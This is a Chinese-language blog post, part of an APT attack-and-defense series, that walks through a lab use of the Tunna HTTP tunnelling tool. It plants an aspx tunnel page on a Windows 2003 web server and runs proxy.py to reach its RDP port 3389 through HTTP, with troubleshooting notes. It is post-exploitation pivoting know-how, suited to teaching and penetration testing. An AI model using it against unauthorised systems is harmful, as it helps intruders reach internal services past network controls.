# 专注APT攻击与防御
https://micropoor.blogspot.com/

**Tunna简介：**

Tunna1.1 是 secforce 在2014年11月出品的一款基于HTTP隧道工具。其中v1.1中支持了SOCKS4a。

Tunna演示稿：
https://drive.google.com/open?id=1PpB8_ks93isCaQMEUFf_cNvbDsBcsWzE

Github：
https://github.com/SECFORCE/Tunna

**攻击机：** 
192.168.1.5 Debian
192.168.1.4 Windows 7

**靶机：** 
192.168.1.119 Windows 2003

**安装：**
```bash
root@John:~# git clone https://github.com/SECFORCE/Tunna.git
Cloning into 'Tunna'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 156 (delta 0), reused 2 (delta 0), pack‐reused 150
Receiving objects: 100% (156/156), 8.93 MiB | 25.00 KiB/s, done.
Resolving deltas: 100% (84/84), done.
```
![](media/dac94b993935a569d6b5cec53e91eb54.jpg)

**靶机执行：**

以aspx为demo。
![](media/45105406fce5e573635d20030393a928.jpg)

**攻击机执行：**
```python
python proxy.py ‐u http://192.168.1.119/conn.aspx ‐l 1234 ‐r 3389 ‐s ‐ v
```
![](media/270e3220479652ae6eb658f40156cf97.jpg)

![](media/5e8e8a0ea358fdf98fc37bbb31b5994e.jpg)


## 附录：

**解决：**General Exception: [Errno 104] Connection reset by peer
```bash
[+] Spawning keep‐alive thread
[‐] Keep‐alive thread not required
[+] Checking for proxy: False
```

连接后，出现
```bash
General Exception: [Errno 104] Connection reset by peer
```

等待出现：**无法验证此远程计算机的身份，是否仍要连接？**

再次运行，在点击是(Y)
```bash
python proxy.py ‐u http://192.168.1.119/conn.aspx ‐l 1234 ‐r 3389 ‐s ‐ v
```
![](media/086a4ba0d1640a1d5b5efb747490329d.jpg)

![](media/1a7fb8afe7862e95f22ce331e1ea6480.jpg)

![](media/89343acc07c18c27399943cd200091b6.jpg)


**如果：没有出现“无法验证此远程计算机的身份，是否仍要连接？”**

注册表键值：
HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers
删除对应IP键值即可。

非常遗憾的是，Tunna对PHP的支持并不是太友好。

>   Micropoor
